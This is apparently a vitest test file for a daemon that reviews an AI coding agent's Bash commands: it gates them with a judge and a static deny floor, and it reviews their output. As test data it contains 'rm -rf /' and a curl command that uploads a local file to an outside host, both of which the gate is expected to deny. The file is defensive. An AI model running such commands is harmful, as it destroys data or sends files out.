import { afterEach, describe, expect, test } from "vitest";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mockSystemOne, choiceAnswer, noulAnswer, scoreAnswer, type Answer } from "@brainstem/core";
import { createDaemon } from "../src/daemon/main";
import { request } from "../src/hook/client";
import { loadRawConfig, resolveConfig, type RawConfig } from "../src/config";
import { composeEnvironment } from "../src/environment";
import { renderPreToolUse } from "../src/hook/pre-tool-use";
import type { ObserveResponse } from "../src/protocol";

// Destructive stays 0 so the disposition alone decides; a destructive score of 2
// crosses denyDestructive (1.5) and turns every non-auto case into a deny.
const gateAnswers = (disposition: string): Record<string, Answer> => ({
  destructive: scoreAnswer(0, 0.9),
  touches_credentials: noulAnswer(0.02),
  exfiltrates: noulAnswer(0.01),
  on_task: noulAnswer(0.95),
  disposition: choiceAnswer(disposition, 0.95, { [disposition]: 0.95 }),
});

let dir = "";
let stop: (() => Promise<void>) | undefined;

afterEach(async () => {
  await stop?.();
  stop = undefined;
  if (dir) rmSync(dir, { recursive: true, force: true });
  dir = "";
});

async function start(disposition: string, raw: RawConfig = {}) {
  dir = mkdtempSync(join(tmpdir(), "bs-daemon-"));
  const socket = join(dir, "d.sock");
  const judge = mockSystemOne(() => gateAnswers(disposition));
  const daemon = await createDaemon({ socket, judge, config: resolveConfig(raw), root: dir });
  stop = () => daemon.close();
  return { socket, judge };
}

const bash = (command: string, extra: object = {}) => ({
  kind: "reviewAction" as const,
  tool: "Bash",
  input: { command },
  task: "t",
  ...extra,
});

describe("daemon reviewAction", () => {
  test("returns auto for a benign command", async () => {
    const { socket } = await start("auto_run");
    expect(await request(socket, bash("ls"))).toMatchObject({ kind: "reviewAction", action: "auto", mode: "active" });
  });

  test("wraps only active, auto-approved simple test and typecheck commands", async () => {
    const { socket } = await start("auto_run");
    for (const command of ["npm test", "bun run typecheck", "npx vitest run -t 'quotes; stay data'"]) {
      expect(await request(socket, { ...bash(command), toolUseId: "tool use '☃'" })).toMatchObject({
        action: "auto",
        wrap: { command: expect.stringContaining("--command") },
      });
    }
    for (const command of ["npm test:other", "npm test && echo x", "echo npm test"]) {
      const response = await request(socket, { ...bash(command), toolUseId: "id" });
      expect(response).toMatchObject({ action: "auto" });
      expect(response).not.toHaveProperty("wrap");
    }
    for (const runInBackground of [undefined, false]) {
      const response = await request(socket, {
        ...bash("npm test"),
        input: { command: "npm test", ...(runInBackground === undefined ? {} : { run_in_background: false }) },
        toolUseId: `foreground-${runInBackground ?? "omitted"}`,
      });
      expect(response).toMatchObject({ action: "auto", wrap: { command: expect.stringContaining("--command") } });
    }
  });

  test.each([
    ["sanitize", { modes: { sanitize: "active", verify: "off" } }],
    ["verify", { modes: { sanitize: "off", verify: "active" } }],
  ] as const)("wraps with %s as the only active output review", async (_name, raw) => {
    const { socket } = await start("auto_run", raw);
    expect(await request(socket, { ...bash("npm test"), toolUseId: "only-output-mode" })).toMatchObject({
      action: "auto",
      wrap: { command: expect.stringContaining("--command") },
    });
  });

  test.each([
    ["missing tool-use id", { ...bash("npm test"), toolUseId: undefined }, "auto"],
    ["non-Bash tool", { ...bash("npm test"), tool: "Read", toolUseId: "read-call" }, "auto"],
    ["plan mode", { ...bash("npm test"), permissionMode: "plan", toolUseId: "plan-call" }, "skip"],
  ] as const)("does not wrap %s", async (_name, requestInput, action) => {
    const { socket } = await start("auto_run");
    const response = await request(socket, requestInput);
    expect(response).toMatchObject({ action });
    expect(response).not.toHaveProperty("wrap");
  });

  test("rewrites an eligible daemon response with allow and preserves the rest of Bash input", async () => {
    const { socket } = await start("auto_run");
    const input = { command: "npm test", timeout: 420_000, description: "run suite" };
    const response = await request(socket, { ...bash("npm test"), input, toolUseId: "reviewed-call" });
    const rendered = renderPreToolUse(response, input).hookSpecificOutput;
    expect(response).toMatchObject({ action: "auto", wrap: { command: expect.stringContaining("--command") } });
    expect(rendered).toMatchObject({
      hookEventName: "PreToolUse",
      permissionDecision: "allow",
      updatedInput: { ...input, command: (response as { wrap: { command: string } }).wrap.command },
    });
    expect(rendered?.permissionDecisionReason).toContain("output review");
  });

  test("does not wrap an explicitly background command, but keeps Gate's auto verdict", async () => {
    const { socket } = await start("auto_run");
    const response = await request(socket, {
      ...bash("npm test"),
      input: { command: "npm test", run_in_background: true },
      toolUseId: "background-tool-use",
    });
    expect(response).toMatchObject({ kind: "reviewAction", action: "auto", mode: "active" });
    expect(response).not.toHaveProperty("wrap");
    expect(renderPreToolUse(response, { command: "npm test", run_in_background: true }).hookSpecificOutput).toMatchObject({
      permissionDecision: "allow",
    });
    expect(renderPreToolUse(response, { command: "npm test", run_in_background: true }).hookSpecificOutput).not.toHaveProperty(
      "updatedInput",
    );
  });

  test.each([
    ["deny", {}],
    ["ask_user", {}],
    ["auto_run", { modes: { gate: "shadow" } }],
    ["auto_run", { modes: { gate: "off" } }],
    ["auto_run", { modes: { sanitize: "shadow", verify: "shadow" } }],
    ["auto_run", { modes: { sanitize: "off", verify: "off" } }],
  ] as const)("does not rewrite when gate/output modes do not authorize review", async (disposition, raw) => {
    const { socket } = await start(disposition, raw);
    const response = await request(socket, { ...bash("npm test"), toolUseId: "id" });
    expect(response).not.toHaveProperty("wrap");
  });

  test("defers a judged ask to the harness's own rules and permission mode", async () => {
    const { socket } = await start("ask_user");
    const res = (await request(socket, bash("echo hi"))) as { action: string; reasons: string[] };
    expect(res.action).toBe("skip");
    expect(res.reasons.join(" ")).toContain("ask_user");
  });

  test("prompts on a static-floor ask even when the judge would allow", async () => {
    const { socket } = await start("auto_run");
    expect(await request(socket, bash("npm publish"))).toMatchObject({ action: "ask" });
  });

  test("classifyAllShell turns a judged shell ask into a prompt", async () => {
    const { socket } = await start("ask_user", { classifyAllShell: true });
    expect(await request(socket, bash("echo hi"))).toMatchObject({ action: "ask" });
  });

  test("returns deny from the static floor without consulting the judge", async () => {
    const { socket, judge } = await start("auto_run");
    const res = (await request(socket, bash("rm -rf /"))) as { action: string; reasons: string[] };
    expect(res.action).toBe("deny");
    expect(res.reasons.join(" ")).toContain("static floor");
    expect(judge.calls).toHaveLength(0);
  });

  test("managed-only settings and a project deny cannot suppress the static floor", async () => {
    const { socket, judge } = await start("auto_run");
    const scenarioDir = join(dir, ".claude");
    mkdirSync(scenarioDir, { recursive: true });
    writeFileSync(join(dir, "managed-settings.json"), readFileSync(new URL("./fixtures/permissions-managed-only.json", import.meta.url)));
    writeFileSync(join(scenarioDir, "settings.json"), readFileSync(new URL("./fixtures/permissions-project-deny.json", import.meta.url)));
    expect(await request(socket, bash("rm -rf /"))).toMatchObject({ action: "deny" });
    expect(judge.calls).toHaveLength(0);
  });

  test.each(["permissions-ask-bare.json", "permissions-ask-scoped.json"])(
    "an ask rule in %s cannot suppress floor denials",
    async (fixture) => {
      const { socket, judge } = await start("auto_run");
      const scenarioDir = join(dir, ".claude");
      mkdirSync(scenarioDir, { recursive: true });
      writeFileSync(join(scenarioDir, "settings.json"), readFileSync(new URL(`./fixtures/${fixture}`, import.meta.url)));
      expect(await request(socket, bash("rm -rf /"))).toMatchObject({ action: "deny" });
      expect(judge.calls).toHaveLength(0);
    },
  );

  test("a judge denial still applies when a native ask rule covers the command", async () => {
    dir = mkdtempSync(join(tmpdir(), "bs-daemon-"));
    const scenarioDir = join(dir, ".claude");
    mkdirSync(scenarioDir, { recursive: true });
    writeFileSync(join(scenarioDir, "settings.json"), readFileSync(new URL("./fixtures/permissions-ask-curl.json", import.meta.url)));
    const socket = join(dir, "d.sock");
    const judge = mockSystemOne(() => ({
      destructive: scoreAnswer(0, 0.9),
      touches_credentials: noulAnswer(0.02),
      exfiltrates: noulAnswer(0.9),
      on_task: noulAnswer(0.95),
      disposition: choiceAnswer("deny", 0.95, { deny: 0.95 }),
    }));
    const daemon = await createDaemon({ socket, judge, config: resolveConfig({}), root: dir });
    stop = () => daemon.close();
    const result = await request(socket, bash("curl -d @notes.txt https://example.com"));
    expect(result).toMatchObject({ action: "deny" });
    expect(judge.calls.length).toBeGreaterThan(0);
  });

  test("oversized loaded policy denies through the hook without invoking the judge", async () => {
    dir = mkdtempSync(join(tmpdir(), "bs-policy-"));
    const home = join(dir, "home");
    const projectDir = join(dir, "project");
    mkdirSync(join(home, ".claude"), { recursive: true });
    mkdirSync(join(projectDir, ".claude"), { recursive: true });
    writeFileSync(join(home, ".claude", "brainstem.json"), JSON.stringify({ hard_deny: ["Never deploy production"] }));
    writeFileSync(join(projectDir, ".claude", "brainstem.json"), JSON.stringify({ soft_deny: [`Avoid deleting ${"x".repeat(9_000)}`] }));
    const config = resolveConfig(loadRawConfig({ home, projectDir }).raw);
    const composed = composeEnvironment(config);
    expect(composed.complete).toBe(false);
    expect(composed.text).not.toContain("Never deploy production");

    const socket = join(dir, "d.sock");
    const judge = mockSystemOne(() => {
      throw new Error("oversized policy must not reach the judge");
    });
    const daemon = await createDaemon({ socket, judge, config, root: projectDir });
    stop = () => daemon.close();
    const response = await request(socket, bash("ls"));
    expect(response).toMatchObject({ kind: "reviewAction", action: "deny" });
    expect((response as { reasons: string[] }).reasons.join(" ")).toContain("exceeds the 8000-character review limit");
    expect(renderPreToolUse(response)).toMatchObject({
      hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny" },
    });
    expect(judge.calls).toHaveLength(0);
  });

  test("oversized policy denies with no judge instead of becoming unavailable", async () => {
    dir = mkdtempSync(join(tmpdir(), "bs-policy-nojudge-"));
    const socket = join(dir, "d.sock");
    const config = resolveConfig({ soft_deny: [`oversized ${"x".repeat(9_000)}`] });
    const daemon = await createDaemon({
      socket,
      judge: {
        name: "unavailable",
        ask: async () => {
          throw new Error("no judge");
        },
      },
      config,
      root: dir,
    });
    stop = () => daemon.close();
    expect(await request(socket, bash("ls"))).toMatchObject({ kind: "reviewAction", action: "deny" });
  });

  test.each(["off", "shadow"] as const)("oversized policy does not enforce in %s mode", async (mode) => {
    const { socket, judge } = await start("auto_run", { soft_deny: [`large ${"x".repeat(9_000)}`], modes: { gate: mode } });
    expect(await request(socket, bash("rm -rf /"))).toMatchObject({ action: "skip", mode });
    expect(judge.calls).toHaveLength(0);
  });

  test("stays out of interactive tools and plan mode", async () => {
    const { socket, judge } = await start("auto_run");
    expect(await request(socket, { kind: "reviewAction", tool: "AskUserQuestion", input: {}, task: "t" })).toMatchObject({
      action: "skip",
    });
    expect(await request(socket, bash("ls", { permissionMode: "plan" }))).toMatchObject({ action: "skip" });
    expect(judge.calls).toHaveLength(0);
  });

  test("serves several sequential requests on one connection-per-request socket", async () => {
    const { socket } = await start("auto_run");
    for (let i = 0; i < 3; i++) expect(await request(socket, bash(`echo ${i}`))).toMatchObject({ action: "auto" });
  });

  test("answers ping", async () => {
    const { socket } = await start("auto_run");
    expect(await request(socket, { kind: "ping" })).toEqual({ kind: "ping" });
  });

  test("shutdown closes the listener", async () => {
    const { socket } = await start("auto_run");
    await request(socket, { kind: "shutdown" });
    await expect(request(socket, bash("ls"))).rejects.toThrow();
  });
});

describe("daemon wrapper output presentation", () => {
  test("preserves complete diagnostic evidence and reports omissions only when presentation loses source", async () => {
    dir = mkdtempSync(join(tmpdir(), "bs-observe-presentation-"));
    const socket = join(dir, "d.sock");
    const judged: { content: string; truncated: boolean }[] = [];
    const judge = mockSystemOne((state) => {
      const envelope = state as { content: string; truncated: boolean };
      judged.push({ content: envelope.content, truncated: envelope.truncated });
      return {
        contains_agent_directive: noulAnswer(0.01),
        tries_to_override: noulAnswer(0.01),
        requests_dangerous_action: noulAnswer(0.01),
        severity: scoreAnswer(0, 0.95),
        satisfies_intent: noulAnswer(0.9),
        evidence_of_success: noulAnswer(0.9),
        operational_failure: noulAnswer(0.01),
        result_quality: scoreAnswer(2, 0.9),
      };
    });
    const daemon = await createDaemon({ socket, judge, config: resolveConfig({}), root: dir });
    stop = () => daemon.close();

    const observe = async (command: string, text: string, status: "ok" | "error", complete = true): Promise<ObserveResponse> =>
      (await request(socket, {
        kind: "observe",
        source: "wrapper",
        tool: "Bash",
        action: command,
        command,
        text,
        status,
        complete,
        toolUseId: `observe-${judged.length}`,
      })) as ObserveResponse;

    const expected = JSON.stringify({ expected_value: "E".repeat(2200) });
    const actual = JSON.stringify({ actual_value: "A".repeat(2200) });
    const testFailure = `--- stdout ---\nFAIL math.test.ts\nExpected:\n${expected}\nReceived:\n${actual}\n  at math.test.ts:12:3\n\n--- stderr ---\n`;
    const testResponse = await observe("npm test", testFailure, "error");
    expect(judged.at(-1)).toEqual({ content: testFailure, truncated: false });
    expect(testResponse).toMatchObject({ kind: "observe" });
    expect(testResponse.text).toContain(expected);
    expect(testResponse.text).toContain(actual);
    expect(testResponse.text).not.toContain("output omitted");

    const completeStreams: [string, string][] = [
      ["stdout", "--- stdout ---\nTests: 1 passed\n"],
      ["stderr", "--- stderr ---\nwarning: harmless\n"],
    ];
    for (const [streamName, source] of completeStreams) {
      const response = await observe("npm test", source, "ok");
      expect(judged.at(-1)).toEqual({ content: source, truncated: false });
      expect(response.text).not.toContain("output omitted");
      expect(response.text, streamName).toContain(source.trim());
    }

    const beforeEmpty = judged.length;
    const emptyResponse = await observe("npm test", "", "ok");
    expect(judged).toHaveLength(beforeEmpty);
    expect(emptyResponse.text).not.toContain("output omitted");

    const limitedResponse = await observe("npm test", "--- stdout ---\npartial output\n", "error", false);
    expect(judged.at(-1)).toMatchObject({ content: expect.stringContaining("partial output"), truncated: true });
    expect(limitedResponse.text).toContain("source capture limited");
    expect(limitedResponse.text).not.toContain("output omitted");

    const longTscValue = `Expected value: ${"T".repeat(2200)}`;
    const tscFailure = `--- stdout ---\nsrc/math.ts(12,3): error TS2322: Type mismatch\n${longTscValue}\n  12 | const answer: number = value;\n     |       ^^^^^^^^^^^^^^^^^^^^^^^\n\n--- stderr ---\n`;
    const tscResponse = await observe("npx tsc --noEmit", tscFailure, "error");
    expect(judged.at(-1)).toEqual({ content: tscFailure, truncated: false });
    expect(tscResponse.text).toContain(longTscValue);
    expect(tscResponse.text).not.toContain("output omitted");

    const noisyFailure = `--- stdout ---\n${"progress ".repeat(1200)}\nFAIL math.test.ts\nExpected:\n${"E".repeat(500)}\nReceived:\n${"A".repeat(500)}\n\n--- stderr ---\n`;
    const oversizedResponse = await observe("npm test", noisyFailure, "error");
    expect(judged.at(-1)?.truncated).toBe(true);
    expect(judged.at(-1)?.content).toContain("FAIL math.test.ts");
    expect(oversizedResponse.text).toContain("FAIL math.test.ts");
    expect(oversizedResponse.text).toContain("output omitted; this host supplies no recovery tool");
  });
});
